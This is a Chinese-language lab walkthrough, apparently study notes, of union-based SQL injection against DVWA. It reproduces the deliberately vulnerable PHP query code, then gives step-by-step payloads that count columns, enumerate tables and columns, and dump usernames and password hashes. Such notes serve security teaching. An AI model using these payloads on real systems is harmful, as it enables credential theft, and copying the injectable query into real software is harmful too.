# 目录源码/页面源码
```
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
	// Get input
	$id = $_REQUEST[ 'id' ];

	// Check database
	$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

	// Get results
	while( $row = mysqli_fetch_assoc( $result ) ) {
		// Get values
		$first = $row["first_name"];
		$last  = $row["last_name"];

		// Feedback for end user
		$html .= "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
	}

	mysqli_close($GLOBALS["___mysqli_ston"]);
}

?>
```



# `$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";`



# 1、测试注入点
## `1'` :页面报错,说明存在字符型注入;用单引号闭合,需要用`--(空格)`或`--+`注释掉后面的代码
# 2、判断字段数(列数)
## `1' order by 2 -- +`(页面返回正常);`1' order by 3 -- +`(页面报错)
## 前端SQL查询了2个字段
# 3、联合查询找显示位
### `-1' union select 1,2 -- +` :页面上显示`First name:1`和`Surname:2`
### 第1和第2个字段的内容会回显到页面上;-1是为了让前面的查询为空,从而让后面的结果显示出来
## 4、爆出数据库信息
### `-1' union select 1,database() -- +` :查库名(通常显示dvwa)
### `-1' union select 1,version() -- +` :查版本
### `-1' union select 1,user() -- +` :查当前用户
# 5、爆出表名
## `-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() -- +`(页面回显guestbook,users;主要看user表)
# 6、爆出列名(字段名)
## `-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='user' -- +`(爆出一长串字段名user_id,first_name,last_name,user,password,...;需要user和password)
# 7、爆出账号密码
## `-1' union select user,password from users -- +`(页面回显数据库里所有用户的账号和密码哈希(MD5))

# `--(+空格) `是SQL数据库认的注释符;`--+`是为了应付URL传输而变形的组合体
## SQL中`--`后面必须跟一个空格(或换行符)才会被识别为注释
## URL编码中不能包含裸空格(浏览器遇到空格可能会阶段或者自动转成`%20`);URL中`+`的含义就是空格